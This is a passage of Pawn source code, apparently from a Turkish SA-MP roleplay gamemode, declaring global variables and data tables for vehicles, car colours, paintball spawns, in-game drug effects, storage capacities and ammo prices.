	479,534,440,
	475,543,468,567,405,535,439,561,458,550,
	566,549,576,525,
	558,
	540,491,412,
	478,421,586,529,555,
	456,554
};

new SSGaleriListe[] = {
	429, 402, 541, 415, 480, 579, 545, 411, 522, 603, 489, 409, 580, 560, 506, 451, 477
};

//
//________________________NEW TANITIMLARI_______________________________________newler
new talep[MAX_PLAYERS];
new talepMesaj[MAX_PLAYERS][128];
new Damage1[MAX_PLAYERS][MAX_BODY_PARTS][MAX_WEAPONS];
new hafif_silahlar[2] = {22, 24};
new agir_silahlar[5] = {25, 28, 29, 30, 32};
new bool:snowOn[MAX_PLAYERS];
new snowObject[MAX_PLAYERS][MAX_SNOW_OBJECTS];
new updateTimer[MAX_PLAYERS];
new Text:SagAlt[4];
new EvCheckpointYazi[MAX_PLAYERS];
//new PlayerText:IsimText[MAX_PLAYERS];
new PlayerText:CanTD[MAX_PLAYERS];
new PlayerText:ZirhTD[MAX_PLAYERS];
new PlayerText:SaatTD[MAX_PLAYERS];
new PlayerText:BankaParaTD[MAX_PLAYERS];
new PlayerText:ParaTD[MAX_PLAYERS];
new PlayerText:PaydaySureTD[MAX_PLAYERS];
new bool:gAracParcalanabilir[MAX_VEHICLES];
new bool:silah_kontrol[MAX_PLAYERS];
//new Text:Tel_TD[31];
//new PlayerText:Tel_TD_P[MAX_PLAYERS][5];
new objeduzenle[MAX_PLAYERS];
new objegoruyor[MAX_PLAYERS];
new ServerWeather;
new TumOyuncularEngelli[MAX_PLAYERS];
new bool:PMengelle[MAX_PLAYERS][MAX_PLAYERS];
new Float:markPos[MAX_PLAYERS][3];
new markPosx[MAX_PLAYERS][2];
new Pwep[MAX_PLAYERS];
new Pupdate[MAX_PLAYERS];
new bool:gReklamKapa[MAX_PLAYERS];
new silahIndex[MAX_PLAYERS];
new join[MAX_PLAYERS];
new alreadydone = 0;
new Text:eventText[3];
new event[600];
new eweaps[3],
    ehealth = 0,
    earmour = 0,
    eveh = 0,
    Float:xx,
    Float:yy,
    Float:zz,
    elock = 0,
    efreeze = 0,
    estart = 0,
    eannounce = 0;
new PlayerText:PDMDC[MAX_PLAYERS][55];
new bool:gantiafk=true;
new bool:g2xpayday=false;
new graffiti[MAX_PLAYERS];
new bool:gOtur[MAX_PLAYERS];
new hiletime[MAX_PLAYERS];
new gDedektif[MAX_PLAYERS];
new Tuzak[MAX_PLAYERS];
new flashlight[MAX_PLAYERS];
new clearshock[MAX_PLAYERS];
new Flash[MAX_VEHICLES];
new FlashTime[MAX_VEHICLES];
new bool:Debug=false;
new gAracTime[MAX_PLAYERS];
new reklambirlik[MAX_PLAYERS];
new reklamlar[MAX_BIRLIK]=0;
new reklamsira[MAX_PLAYERS];
new gAFKTIMER[MAX_PLAYERS];
new Float:gAFKX[MAX_PLAYERS];
new Float:gAFKY[MAX_PLAYERS];
new Float:gAFKZ[MAX_PLAYERS];
new gAFKRANDOM[MAX_PLAYERS][7];
new bool:AMotorDurdur[MAX_VEHICLES];
new SoygunTextTimer[MAX_PLAYERS];
new PlayerText:SoygunBox[MAX_PLAYERS][5];
new PlayerText:OyuncuSkin[MAX_PLAYERS][5];
new PlayerText:OyuncuLevel[MAX_PLAYERS][5];
new PlayerText:OyuncuSilahTD[MAX_PLAYERS][5];
new PlayerText:OyuncuIsim[MAX_PLAYERS][5];
new IsyeriSoyuluyor[MAX_ISYERI];
new Text3D:gRutbeIsim[MAX_PLAYERS];
new Text3D:aworkIsim[MAX_PLAYERS];
new saatsure=0;
new gPiyango = 0;
new Float:gTx[MAX_PLAYERS], Float:gTy[MAX_PLAYERS], Float:gTz[MAX_PLAYERS], gTint[MAX_PLAYERS], gTvw[MAX_PLAYERS];
new gTvIzliyo[MAX_PLAYERS];
new IzleyenSayisi[MAX_PLAYERS];
new gKameraKurdu[MAX_PLAYERS];
new Float:gKameraPos[MAX_PLAYERS][3];
new Float:gKameraPosE[MAX_PLAYERS][3];
new gKamera[MAX_PLAYERS][6];
new aSecim=0;
new bool:gGarajGirdi[MAX_PLAYERS];
new Float:pHP[MAX_PLAYERS];
new Float:pARMO[MAX_PLAYERS];
new gPBTeam[MAX_PLAYERS];
new bool:gMekanGeziyor[MAX_PLAYERS], gMekanTimer[MAX_PLAYERS];
new AlarmTimer[MAX_VEHICLES];
new bool:gTIslemde[MAX_PLAYERS];
new bool:aTIslemde[MAX_PLAYERS];
new bool:gBuluyor[MAX_PLAYERS];
new acol1[MAX_VEHICLES],acol2[MAX_VEHICLES];
new gToolkit[MAX_PLAYERS];
new gMaske[MAX_PLAYERS];
new tCheckpoint[MAX_PLAYERS];
new bool:dilkullaniyor[MAX_PLAYERS];
new TemizlikYol[MAX_PLAYERS];
new denemegiris[MAX_PLAYERS];
new PistolElinde[MAX_PLAYERS];
new DeagleElinde[MAX_PLAYERS];
new DestekTimer[MAX_PLAYERS];
new DestekTimer2[MAX_PLAYERS];
new DestekTimer3[MAX_PLAYERS];
new DestekTimer4[MAX_PLAYERS];
new PizzaTimer[MAX_PLAYERS];
new PlayerText:SilahTD[MAX_PLAYERS];
new PlayerText:SS[MAX_PLAYERS];
new bool:sdurum[MAX_PLAYERS];
new PlayerText:TaksimetreTD[MAX_PLAYERS], PlayerText:HizTD[MAX_PLAYERS], PlayerText:BenzinTD[MAX_PLAYERS], PlayerText:KmTD[MAX_PLAYERS];
//new Text:Line1;
new PlayerText:GeriSayimTD[MAX_PLAYERS];
new _iayarlandi=0;
new _eayarlandi=0;
new UKutuTasiyor[MAX_PLAYERS];
new CarFullHealth[MAX_VEHICLES],TimerPlayerInCar[MAX_PLAYERS];
new Hits[MAX_PLAYERS];
new Warnnings[MAX_PLAYERS];
new HitPlayer[MAX_PLAYERS];
new bool:AFK[MAX_PLAYERS];
new dortsaniye;
new bunnyhop[MAX_PLAYERS];
new MateryalSilah[MAX_PLAYERS];
new kindex[MAX_PLAYERS];
new Kutular[MAX_VEHICLES];
new Esyalar[MAX_VEHICLES];
new KutuTasiyor[MAX_PLAYERS];
new dovustil[MAX_PLAYERS];
new kazanantaraf;
new Float:dovussure=1.0;
new bahistip[MAX_PLAYERS];
new bahispara[MAX_PLAYERS];
new tarafseciyo[MAX_PLAYERS];
new bool:dovus=false;
new bool:dovusex=false;
new mavitaraf=-1,kirmizitaraf=-1;
new otuzsaniye=0;
new gunindex[MAX_PLAYERS];
new gateduzen[MAX_PLAYERS];
new gateduzenle[MAX_PLAYERS];
new gategoruyor[MAX_PLAYERS];
new Float:PlayerCruiseSpeed[MAX_PLAYERS];
new Float:PlayerHeadingAngle[MAX_PLAYERS];
new CCKey = KEY_ACTION; //Cruise Control Key - change this if you need
new silahalev[MAX_PLAYERS];
new factayarliyo[MAX_PLAYERS];
new KiyafetUcreti[MAX_PLAYERS];
new SectigiKiyafet[MAX_PLAYERS];
new sarkidinliyo[MAX_PLAYERS];
new tisbasi[MAX_PLAYERS];
new cezali[MAX_VEHICLES];
new meslekbul[MAX_PLAYERS];
new sandalyeobje[MAX_PLAYERS];
new otobuste[MAX_PLAYERS];
new renk1ayarliyo[MAX_PLAYERS];
new renk2ayarliyo[MAX_PLAYERS];
new pdaksesuarda[MAX_PLAYERS];
new mcaksesuarda[MAX_PLAYERS];
new AracModifiyeleri[MAX_VEHICLES][aVeriler];
new kArac[MAX_PLAYERS];
new ModifiyeYapiyor[MAX_PLAYERS],ModifiyeTip[MAX_PLAYERS],ModifiyeZaman[MAX_PLAYERS],ModifiyeObje[MAX_PLAYERS],ModifiyeUcret[MAX_PLAYERS];
new Modifiyeli[MAX_VEHICLES];
new mobilyaci[MAX_PLAYERS];
new mobilyaci2[MAX_PLAYERS];
new mobilyaci3[MAX_PLAYERS];
new mobilyaci4[MAX_PLAYERS];
new mobilyaci5[MAX_PLAYERS];
new maskegiyiyor[MAX_PLAYERS];
new mik[MAX_PLAYERS];
new k9izin[MAX_PLAYERS];
new reklamesaj[196][MAX_PLAYERS];
new reklamgonderdi[MAX_PLAYERS];
new reklamfiyat[MAX_PLAYERS];
new MechLift;
new ehliyettesti[MAX_PLAYERS];
new ehliyetaraci[MAX_PLAYERS];
new ehliyetuyari[MAX_PLAYERS];
new ehliyetcp[MAX_PLAYERS];
new LSPDObjs[8][3];
new SanTVGates[2][2];
new PDDestek[MAX_PLAYERS] = 0;
new HDestek[MAX_PLAYERS] = 0;
new adminpm[MAX_PLAYERS] = 0;
new PDHDestek[MAX_PLAYERS] = 0;
new HPDDestek[MAX_PLAYERS] = 0;
new PDFDestek[MAX_PLAYERS] = 0;
new FPDDestek[MAX_PLAYERS] = 0;
new Text3D:tanismaIsim[MAX_PLAYERS];
new Text3D:tanismaHP[MAX_PLAYERS];
new mermiliSilahlar[24] = {16, 17, 18, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43};
new SilahKullaniyor[MAX_PLAYERS];
new AntiAmmoHackoldammo[MAX_PLAYERS];
new weapons2[13][2];
new DeagleVote, ShotgunVote, M4Vote, Mp5Vote, SnipeVote, PlayerPBKills[MAX_PLAYERS], PlayerPBing[MAX_PLAYERS], PBLeaderid = 999, PBLeaderKills = 0, PBPlayers = 0, PBGunID, bool:PBStarted;
new GozBaglandi[MAX_PLAYERS], GozBaglayan[MAX_PLAYERS];
new isOn[MAX_PLAYERS];
new campnumber[MAX_PLAYERS];
new FontBoyutu[MAX_PLAYERS];
//new depremvakti = 0;
new MateryalBoyutu[MAX_PLAYERS];
new FontBold[MAX_PLAYERS];
new gObjesi[MAX_PLAYERS];
new PlayerAmmo[MAX_PLAYERS][44];
new WeaponUniqueID[MAX_PLAYERS][44];
new kapi[2][2];
new Tezgah[MAX_PLAYERS][3];
new Float:tPos[MAX_PLAYERS][3];
new FEngel[MAX_BIRLIK];
new Text3D:rennieRadyoLabel[MAX_PLAYERS];
new Text3D:SandalyeLabel[MAX_PLAYERS];
new Text3D:TezgahLabel[MAX_PLAYERS];
new RadyoVirtual[MAX_PLAYERS];
new rennieRadyo[MAX_PLAYERS];
new rennieRadyoObject[MAX_PLAYERS];
new Radyorenniem[MAX_PLAYERS];
new RadyoOyuncu[MAX_PLAYERS];
new rennieRadyoURL[MAX_PLAYERS][256];
new Float:rennieradyopos[MAX_PLAYERS][4];
new lspdgaraj[2], /*lspdcubuk[2],*/ lspdkapi[2], lspdkodes[10];
new lastintid;
new AracKemeri[MAX_PLAYERS];
new AracKemerix[MAX_PLAYERS];
new UstunuAra[MAX_PLAYERS];
new Taksimetre[MAX_VEHICLES][4];
new Taksi[MAX_PLAYERS];
new aksEdit[MAX_PLAYERS] = -1;
new TaksiCagrisi[MAX_PLAYERS];
new Onizlemede[MAX_PLAYERS];
new Modifiyede[MAX_PLAYERS];
new SectigiAksesuar[MAX_PLAYERS];
new AksesuarUcreti[MAX_PLAYERS];
new Arama[MAX_PLAYERS][4]; // 0 - arýyor 1- aranýyor 2 - konuþuyorlar 3 - arama süresi
new gSpectateID[MAX_PLAYERS];
new gSpectateType[MAX_PLAYERS];
new AdminDuyma[MAX_PLAYERS];
//new Text:BlackScreen;
new SonArac[MAX_PLAYERS];
new DamagedHP[MAX_PLAYERS];
new PayDayTimerPublic[MAX_PLAYERS] = -1;
new SevkiyatCheckpoint[MAX_PLAYERS];
new SevkiyatGorev[MAX_PLAYERS];
new PizzaGorevde[MAX_PLAYERS];
new PizzaCheckpoint[MAX_PLAYERS];
new SicilTGorevde[MAX_PLAYERS];
new SicilTCheckpoint[MAX_PLAYERS];
new KamGorevde[MAX_PLAYERS];
new EleGorevde[MAX_PLAYERS];
new LojGorevde[MAX_PLAYERS];
new KamCheckpoint[MAX_PLAYERS];
new EleCheckpoint[MAX_PLAYERS];
new LojCheckpoint[MAX_PLAYERS];
new BalikVuruyorVar[MAX_PLAYERS];
new YemOltada[MAX_PLAYERS];
new BalikCekiyor[MAX_PLAYERS];
new balikvuruyortimer[MAX_PLAYERS] = -1;
new BalikTutuyor[MAX_PLAYERS];
new PlayerText:qwe[MAX_PLAYERS][34];
new PlayerText:rty[MAX_PLAYERS][36];
new barikatliste = mS_INVALID_LISTID;
new fdbarikatliste = mS_INVALID_LISTID;
new Yayin[MAX_PLAYERS];
new Yayinda[MAX_PLAYERS];
new KDuzenleVar[MAX_PLAYERS];
new Tasiyor[MAX_PLAYERS];
new dakikasure=0;
new SelectObjectTur[MAX_PLAYERS];
new UyusturucuEtkiVar[MAX_PLAYERS] = -1;
new UyusturucuTeklif[MAX_PLAYERS];
new UyusturucuTeklifMiktar[MAX_PLAYERS];
new UyusturucuTeklifFiyat[MAX_PLAYERS];
new MalSatYTeklif[MAX_PLAYERS];
new MalSatYMiktar[MAX_PLAYERS];
new MalSatYFiyat[MAX_PLAYERS];

new Text:ChangeColor[66];
new ColorsAvailable[66] = {
        1, 0, 2, 3, 4, 6, 8, 12, 13, 16, 17, 20, 24, 28, 44, 43, 46, 51, 52, 55, 57, 79, 93, 86, 87, 65, 97, 112, 117, 118, 126, 111, 103, 102, 128, 145, 136, 139, 143, 158, 175, 170, 171, 154, 176, 179, 182, 191, 194, 195, 196, 198, 215, 224, 225, 237, 241, 244, 245, 248, 251, 252, 253, 254
};


new AllCarColors[256] = {
        0x000000FF,0xFFFFFFFF,0x55aaa7FF,0xce575bFF,0x58685dFF,0xb06c77FF,0xf8ad38FF,0x7a96acFF,0xdfdec9FF,0x81897aFF,
        0x677776FF,0x93948eFF,0x7e9689FF,0x807c70FF,0xe8eac3FF,0xbab9a5FF,0x73996aFF,0xa54549FF,0xc55063FF,0xd8d5b2FF,
        0x86979eFF,0xa66b67FF,0x8e4556FF,0xcfc3a9FF,0x6c6d65FF,0x5b5a55FF,0xafb295FF,0x77705eFF,0x5a6466FF,0xa89f82FF,
        0x64433aFF,0x73423dFF,0xb5bcb4FF,0xa1a58aFF,0x96947fFF,0x918a6cFF,0x5a5b53FF,0x5b6656FF,0xa8b186FF,0x8d9389FF,
        0x3f3c35FF,0x80765dFF,0x873b3bFF,0x7d3334FF,0x3b5741FF,0x71413dFF,0xaaa176FF,0x89815dFF,0xc2b894FF,0xd6d0b0FF,
        0xa9a98fFF,0x647d67FF,0x849283FF,0x495261FF,0x565b61FF,0x9d846eFF,0xb0af90FF,0xa19273FF,0x7a3138FF,0x5c6c69FF,
        0x9e9c83FF,0x887554FF,0x803c3dFF,0x928f7cFF,0xcfcda7FF,0xd4d27fFF,0x6f534fFF,0xa7ada1FF,0xe1dd9eFF,0xd9b79bFF,
        0xa84645FF,0x96a097FF,0x6f725dFF,0xb6bd93FF,0x764040FF,0x434842FF,0xb0ac89FF,0xb5a778FF,0x8a473fFF,0x375369FF,
        0x9a555aFF,0xaa9c75FF,0xac5359FF,0x56665bFF,0x786151FF,0x995061FF,0x60843cFF,0x72858bFF,0x7c454aFF,0xa7a373FF,
        0xb8b29aFF,0x585e5cFF,0x827f6eFF,0x388a85FF,0x4b6566FF,0x4c5858FF,0xc3c0a1FF,0x97a79aFF,0x80a999FF,0xe1c99dFF,
        0x6e8c8aFF,0x57585cFF,0xd6b98dFF,0x426d80FF,0xa29368FF,0x818274FF,0x3d717fFF,0xb6ab7eFF,0x587482FF,0x696a62FF,
        0x8f7d59FF,0xa3a091FF,0x80948bFF,0x786954FF,0x72866aFF,0xaa4553FF,0x53616aFF,0x8f4f4fFF,0xbfc1b6FF,0x938369FF,
        0xb5a180FF,0x763b41FF,0x747567FF,0x846c50FF,0x914b4dFF,0x38526bFF,0xef87a2FF,0x3c3d38FF,0x6cb85dFF,0x725a4eFF,
        0x78acaaFF,0x987e59FF,0x9b675aFF,0x545d4cFF,0x706c83FF,0x7dc6bdFF,0xcb90c6FF,0x7fca6fFF,0xf7ebc3FF,0x9697abFF,
        0xc3bda3FF,0xbdaf88FF,0xcdbf67FF,0xab8e90FF,0xa28796FF,0xd2ee99FF,0xbd8a93FF,0xaa6a85FF,0x72715cFF,0x665b45FF,
        0x656952FF,0x7e926fFF,0x7398b5FF,0x7da477FF,0x6bcf79FF,0x65c8a9FF,0xe0d59dFF,0xc8c5b4FF,0xde7c5fFF,0x77694cFF,
        0x5d6d49FF,0xd17f74FF,0x6f93b3FF,0x62b79aFF,0x667264FF,0x6aa998FF,0x6daaa5FF,0xaa7faaFF,0x875e4aFF,0xbfb1b0FF,
        0xb4a8acFF,0x987f9dFF,0x686947FF,0x80604bFF,0x8e6c50FF,0xd8685aFF,0xd294a9FF,0xbf9899FF,0xbb839cFF,0x826168FF,
        0xbd825aFF,0xba6254FF,0xd28865FF,0xcf7958FF,0xc88c84FF,0xbba899FF,0x4f5847FF,0x516b48FF,0x6c825bFF,0x677c5bFF,
        0xaa757dFF,0x8dca85FF,0xd4c7a4FF,0xc0bfaaFF,0xdfd249FF,0xbac775FF,0xbdc2a2FF,0xbabb5eFF,0x717caaFF,0x7d7b4aFF,
        0xc1aa74FF,0x536370FF,0x79936cFF,0x606f6cFF,0x798f8dFF,0x515459FF,0x4d585aFF,0x677a76FF,0x7d99a7FF,0x5d7b7dFF,
        0x6f8b8cFF,0x72668aFF,0xac6c53FF,0xd3caadFF,0x98a053FF,0x545945FF,0xcc996eFF,0xa3caafFF,0xd29779FF,0xcc9054FF,
        0xdd888fFF,0xd6c377FF,0xd07151FF,0x596271FF,0x936556FF,0x89864fFF,0x9cd665FF,0x5a765dFF,0xd0b858FF,0x66b758FF,
        0x83605aFF,0xb79153FF,0xc37d9fFF,0xbf6791FF,0x5b7f51FF,0x71894fFF,0x5d7166FF,0xc3919dFF,0xcca470FF,0xaf6c52FF,
        0x77c4a4FF,0x99c556FF,0x9b616fFF,0x63bd63FF,0x7c5d49FF,0x57694fFF,0x809ea8FF,0x748080FF,0x935d5bFF,0x90575eFF,
        0xaaa184FF,0x7d7e70FF,0x716d62FF,0xc9c3a3FF,0x9b907aFF,0x838786FF
};

new AllCarColors2[][] = {
        {"0x000000FF"},{"0xFFFFFFFF"},{"0x55aaa7FF"},{"0xce575bFF"},{"0x58685dFF"},{"0xb06c77FF"},{"0xf8ad38FF"},{"0x7a96acFF"},{"0xdfdec9FF"},{"0x81897aFF"},
        {"0x677776FF"},{"0x93948eFF"},{"0x7e9689FF"},{"0x807c70FF"},{"0xe8eac3FF"},{"0xbab9a5FF"},{"0x73996aFF"},{"0xa54549FF"},{"0xc55063FF"},{"0xd8d5b2FF"},
        {"0x86979eFF"},{"0xa66b67FF"},{"0x8e4556FF"},{"0xcfc3a9FF"},{"0x6c6d65FF"},{"0x5b5a55FF"},{"0xafb295FF"},{"0x77705eFF"},{"0x5a6466FF"},{"0xa89f82FF"},
        {"0x64433aFF"},{"0x73423dFF"},{"0xb5bcb4FF"},{"0xa1a58aFF"},{"0x96947fFF"},{"0x918a6cFF"},{"0x5a5b53FF"},{"0x5b6656FF"},{"0xa8b186FF"},{"0x8d9389FF"},
        {"0x3f3c35FF"},{"0x80765dFF"},{"0x873b3bFF"},{"0x7d3334FF"},{"0x3b5741FF"},{"0x71413dFF"},{"0xaaa176FF"},{"0x89815dFF"},{"0xc2b894FF"},{"0xd6d0b0FF"},
        {"0xa9a98fFF"},{"0x647d67FF"},{"0x849283FF"},{"0x495261FF"},{"0x565b61FF"},{"0x9d846eFF"},{"0xb0af90FF"},{"0xa19273FF"},{"0x7a3138FF"},{"0x5c6c69FF"},
        {"0x9e9c83FF"},{"0x887554FF"},{"0x803c3dFF"},{"0x928f7cFF"},{"0xcfcda7FF"},{"0xd4d27fFF"},{"0x6f534fFF"},{"0xa7ada1FF"},{"0xe1dd9eFF"},{"0xd9b79bFF"},
        {"0xa84645FF"},{"0x96a097FF"},{"0x6f725dFF"},{"0xb6bd93FF"},{"0x764040FF"},{"0x434842FF"},{"0xb0ac89FF"},{"0xb5a778FF"},{"0x8a473fFF"},{"0x375369FF"},
        {"0x9a555aFF"},{"0xaa9c75FF"},{"0xac5359FF"},{"0x56665bFF"},{"0x786151FF"},{"0x995061FF"},{"0x60843cFF"},{"0x72858bFF"},{"0x7c454aFF"},{"0xa7a373FF"},
        {"0xb8b29aFF"},{"0x585e5cFF"},{"0x827f6eFF"},{"0x388a85FF"},{"0x4b6566FF"},{"0x4c5858FF"},{"0xc3c0a1FF"},{"0x97a79aFF"},{"0x80a999FF"},{"0xe1c99dFF"},
        {"0x6e8c8aFF"},{"0x57585cFF"},{"0xd6b98dFF"},{"0x426d80FF"},{"0xa29368FF"},{"0x818274FF"},{"0x3d717fFF"},{"0xb6ab7eFF"},{"0x587482FF"},{"0x696a62FF"},
        {"0x8f7d59FF"},{"0xa3a091FF"},{"0x80948bFF"},{"0x786954FF"},{"0x72866aFF"},{"0xaa4553FF"},{"0x53616aFF"},{"0x8f4f4fFF"},{"0xbfc1b6FF"},{"0x938369FF"},
        {"0xb5a180FF"},{"0x763b41FF"},{"0x747567FF"},{"0x846c50FF"},{"0x914b4dFF"},{"0x38526bFF"},{"0xef87a2FF"},{"0x3c3d38FF"},{"0x6cb85dFF"},{"0x725a4eFF"},
        {"0x78acaaFF"},{"0x987e59FF"},{"0x9b675aFF"},{"0x545d4cFF"},{"0x706c83FF"},{"0x7dc6bdFF"},{"0xcb90c6FF"},{"0x7fca6fFF"},{"0xf7ebc3FF"},{"0x9697abFF"},
        {"0xc3bda3FF"},{"0xbdaf88FF"},{"0xcdbf67FF"},{"0xab8e90FF"},{"0xa28796FF"},{"0xd2ee99FF"},{"0xbd8a93FF"},{"0xaa6a85FF"},{"0x72715cFF"},{"0x665b45FF"},
        {"0x656952FF"},{"0x7e926fFF"},{"0x7398b5FF"},{"0x7da477FF"},{"0x6bcf79FF"},{"0x65c8a9FF"},{"0xe0d59dFF"},{"0xc8c5b4FF"},{"0xde7c5fFF"},{"0x77694cFF"},
        {"0x5d6d49FF"},{"0xd17f74FF"},{"0x6f93b3FF"},{"0x62b79aFF"},{"0x667264FF"},{"0x6aa998FF"},{"0x6daaa5FF"},{"0xaa7faaFF"},{"0x875e4aFF"},{"0xbfb1b0FF"},
        {"0xb4a8acFF"},{"0x987f9dFF"},{"0x686947FF"},{"0x80604bFF"},{"0x8e6c50FF"},{"0xd8685aFF"},{"0xd294a9FF"},{"0xbf9899FF"},{"0xbb839cFF"},{"0x826168FF"},
        {"0xbd825aFF"},{"0xba6254FF"},{"0xd28865FF"},{"0xcf7958FF"},{"0xc88c84FF"},{"0xbba899FF"},{"0x4f5847FF"},{"0x516b48FF"},{"0x6c825bFF"},{"0x677c5bFF"},
        {"0xaa757dFF"},{"0x8dca85FF"},{"0xd4c7a4FF"},{"0xc0bfaaFF"},{"0xdfd249FF"},{"0xbac775FF"},{"0xbdc2a2FF"},{"0xbabb5eFF"},{"0x717caaFF"},{"0x7d7b4aFF"},
        {"0xc1aa74FF"},{"0x536370FF"},{"0x79936cFF"},{"0x606f6cFF"},{"0x798f8dFF"},{"0x515459FF"},{"0x4d585aFF"},{"0x677a76FF"},{"0x7d99a7FF"},{"0x5d7b7dFF"},
        {"0x6f8b8cFF"},{"0x72668aFF"},{"0xac6c53FF"},{"0xd3caadFF"},{"0x98a053FF"},{"0x545945FF"},{"0xcc996eFF"},{"0xa3caafFF"},{"0xd29779FF"},{"0xcc9054FF"},
        {"0xdd888fFF"},{"0xd6c377FF"},{"0xd07151FF"},{"0x596271FF"},{"0x936556FF"},{"0x89864fFF"},{"0x9cd665FF"},{"0x5a765dFF"},{"0xd0b858FF"},{"0x66b758FF"},
        {"0x83605aFF"},{"0xb79153FF"},{"0xc37d9fFF"},{"0xbf6791FF"},{"0x5b7f51FF"},{"0x71894fFF"},{"0x5d7166FF"},{"0xc3919dFF"},{"0xcca470FF"},{"0xaf6c52FF"},
        {"0x77c4a4FF"},{"0x99c556FF"},{"0x9b616fFF"},{"0x63bd63FF"},{"0x7c5d49FF"},{"0x57694fFF"},{"0x809ea8FF"},{"0x748080FF"},{"0x935d5bFF"},{"0x90575eFF"},
        {"0xaaa184FF"},{"0x7d7e70FF"},{"0x716d62FF"},{"0xc9c3a3FF"},{"0x9b907aFF"},{"0x838786FF"}
};

new PBSkins[] =
{
	285
};
new Float:PBSpawns[][] =
{
	{995.5663,-2442.5901,1088.9596,82.0983},//s1
	{999.1273,-2422.2834,1088.9596,87.7383},//s2
	{996.1301,-2380.3940,1088.9596,96.5116},//s3
	{969.6967,-2362.3792,1091.1470,182.6558},//s4
	{935.2584,-2372.0479,1088.9596,213.3627},//s5
	{932.3376,-2389.8435,1088.9596,255.3498},//s6
	{926.9148,-2405.8855,1088.9596,269.4500},//s7
	{921.8528,-2422.9065,1088.9596,278.8501},//s8
	{967.5316,-2451.8555,1091.1470,352.7974}//s9
};
new marijuanahava[11][2] = {
	{-78,0},
	{-84,22},
	{-91,22},
	{-55,22},
	{-22,22},
	{-45,22},
	{-40,22},
	{-61,22},
	{-15,22},
	{-9,22},
	{-116,22}
};
new eroinhava[9][2] = {
	{-74,0},
	{-36,0},
	{-17,0},
	{-16,0},
	{-13,0},
	{-87,22},
	{-82,22},
	{-68,22},
	{-66,22}
};
new kokainhava[3][2] = {
	{-96,22},
	{-79,22},
	{-74,22}
};
new extacyhava[9][2] = {
	{-100,22},
	{-99,22},
	{-98,22},
	{-97,22},
	{-83,22},
	{-80,22},
	{-115,22},
	{-139,22},
	{-79,0}
};
new methhava[12][2] = {
	{-74,0},
	{-36,0},
	{-17,0},
	{-16,0},
	{-13,0},
	{-87,22},
	{-82,22},
	{-68,22},
	{-66,22},
	{-96,22},
	{-79,22},
	{-74,22}
};
new AracSilah[95][] =
{
	{400, 15,"Landstalker"},
	{401, 5,"Bravura"},
	{402, 5,"Buffalo"},
	{404, 10,"Perenniel"},
	{405, 10,"Sentinel"},
	{409, 15,"Stretch"},
	{410, 5,"Manana"},
	{411, 5,"Infernus"},
	{412, 5,"Voodoo"},
	{413, 25,"Pony"},
	{414, 25,"Mule"},
	{415, 5,"Cheetah"},
	{418, 20,"Moonbeam"},
	{419, 5,"Esperanto"},
	{421, 10,"Washington"},
	{422, 15,"Bobcat"},
	{426, 10,"Premier"},
	{429, 5,"Banshee"},
	{436, 5,"Previon"},
	{439, 5,"Stallion"},
	{440, 25,"Rumpo"},
	{442, 20,"Romero"},
	{445, 10,"Admiral"},
	{448, 1,"Pizzaboy"},
	{451, 5,"Turismo"},
	{456, 30,"Yankee"},
	{458, 15,"Solair"},
	{461, 1,"PCJ-600"},
	{462, 1,"Faggio"},
	{463, 1,"Freeway"},
	{466, 10,"Glendale"},
	{467, 10,"Oceanic"},
	{468, 1,"Sanchez"},
	{474, 5,"Hermes"},
	{475, 5,"Sabre"},
	{477, 5,"ZR-350"},
	{478, 10,"Walton"},
	{479, 15,"Regina"},
	{480, 5,"Comet"},
	{482, 25,"Burrito"},
	{483, 15,"Camper"},
	{489, 10,"Rancher"},
	{491, 5,"Virgo"},
	{492, 10,"Greenwood"},
	{496, 5,"Blista Compact"},
	{498, 30,"Boxville"},
	{499, 25,"Benson"},
	{500, 5,"Mesa"},
	{506, 5,"Super GT"},
	{507, 10,"Elegant"},
	{508, 15,"Journey"},
	{516, 10,"Nebula"},
	{517, 5,"Majestic"},
	{518, 5,"Buccaneer"},
	{521, 1,"FCR-900"},
	{522, 1,"NRG-500"},
	{526, 5,"Fortune"},
	{527, 5,"Cadrona"},
	{529, 10,"Willard"},
	{533, 5,"Feltzer"},
	{534, 10,"Remington"},
	{535, 10,"Slamvan"},
	{536, 10,"Blade"},
	{540, 10,"Vincent"},
	{541, 5,"Bullet"},
	{542, 5,"Clover"},
	{543, 5,"Sadler"},
	{545, 5,"Hustler"},
	{546, 10,"Intruder"},
	{547, 10,"Primo"},
	{549, 5,"Tampa"},
	{550, 10,"Sunrise"},
	{551, 10,"Merit"},
	{554, 10,"Yosemite"},
	{555, 5,"Windsor"},
	{558, 5,"Uranus"},
	{559, 5,"Jester"},
	{560, 10,"Sultan"},
	{561, 10,"Stratum"},
	{562, 5,"Elegy"},
	{565, 5,"Flash"},
	{566, 10,"Tahoma"},
	{567, 10,"Savanna"},
	{575, 10,"Broadway"},
	{576, 5,"Tornado,"},
	{579, 10,"Huntley"},
	{580, 10,"Stafford"},
	{581, 1,"BF-400"},
	{585, 10,"Emperor"},
	{586, 1,"Wayfarer"},
	{587, 5,"Euros"},
	{589, 5,"Club"},
	{600, 5,"Picador"},
	{602, 5,"Alpha"},
	{603, 5,"Phoenix"}
};

new erkekkiyafetbeyaz = mS_INVALID_LISTID;
new erkekkiyafetsiyah = mS_INVALID_LISTID;
new kadinkiyafetbeyaz = mS_INVALID_LISTID;
new kadinkiyafetsiyah = mS_INVALID_LISTID;
new yenierkekkiyafetbeyaz = mS_INVALID_LISTID;
new yenierkekkiyafetsiyah = mS_INVALID_LISTID;
new yenikadinkiyafetbeyaz = mS_INVALID_LISTID;
new yenikadinkiyafetsiyah = mS_INVALID_LISTID;
new egirisbeyaz = mS_INVALID_LISTID;
new egirissiyah = mS_INVALID_LISTID;
new kgirisbeyaz = mS_INVALID_LISTID;
new kgirissiyah = mS_INVALID_LISTID;
new pdkiyafeterkek = mS_INVALID_LISTID;
new pdkiyafetkadin = mS_INVALID_LISTID;
new fdkiyafetkadin = mS_INVALID_LISTID;
new fdkiyafeterkek = mS_INVALID_LISTID;
new mdkiyafetkadin = mS_INVALID_LISTID;
new mdkiyafeterkek = mS_INVALID_LISTID;

new MermiVerileri[][] =
{
	//Silahid, Mermi, Para
	{22, 85, 100},
	{24, 35, 300},
	{25, 40, 250},
	{28, 200, 300},
	{32, 200, 300},
	{29, 180, 300},
	{30, 120, 500},
	{33, 40, 500}
};

new AracVerileri[][] =
{
	{482, 5},
	{440, 6},
	{449, 8},
	{414, 8},
	{456, 10},
	{498, 12},
	{609, 12}
};

new BotVerileri[][] =
{
	{473, 2},
	{453, 5},
	{454, 10}
};

